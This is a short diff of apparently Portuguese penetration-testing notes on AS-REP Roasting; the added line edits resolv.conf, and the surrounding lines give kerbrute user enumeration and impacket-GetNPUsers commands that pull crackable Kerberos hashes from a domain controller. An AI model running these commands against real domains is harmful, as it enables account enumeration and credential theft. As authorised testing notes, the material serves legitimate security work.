@@ -9089,6 +9089,7 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
 `AS-REP Roasting` PRECISA DA LISTA DE USUARIO - NAO ESTAR HABILITADO O PREAUTH - ACERTAR os HORARIOS - ADD HOSTNAME AO HOSTS 
 
     sudo nano /etc/hosts ADD IP-DC hostname.domain.local 
+	sudo nano /etc/resolv.conf && echo "COLOCA O IP DO/S SERVIDOR/ES DNS"
     sudo net time set -S IP-DC
 	kerbrute userenum -d floripa.local --dc 192.168.161.100 /usr/share/wordlists/users-pt-br.txt -o valid-users-dump
     impacket-GetNPUsers brasil.floripa.local/ -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -format hashcat -outputfile output-reproast - SALVA HASHES DO TIPO krbtg5 e -m 18200 
